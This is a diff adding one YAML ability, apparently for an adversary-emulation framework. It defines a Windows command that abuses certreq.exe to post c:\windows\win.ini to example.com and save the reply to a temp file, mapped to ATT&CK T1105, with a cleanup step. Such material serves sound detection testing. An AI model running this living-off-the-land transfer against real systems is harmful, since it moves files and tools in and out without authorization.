@@ -1,0 +1,15 @@
+---
+- id: a268a831389fc0be60eefa838ccf80e0
+  name: certreq download
+  description: Use certreq to download a file from the web
+  tactic: command-and-control
+  technique:
+    attack_id: T1105
+    name: Ingress Tool Transfer
+  platforms:
+    windows:
+      cmd:
+        command: certreq.exe -Post -config https://example.com c:\windows\win.ini
+          %temp%\Atomic-license.txt
+        payloads: []
+        cleanup: del %temp%\Atomic-license.txt >nul 2>&1
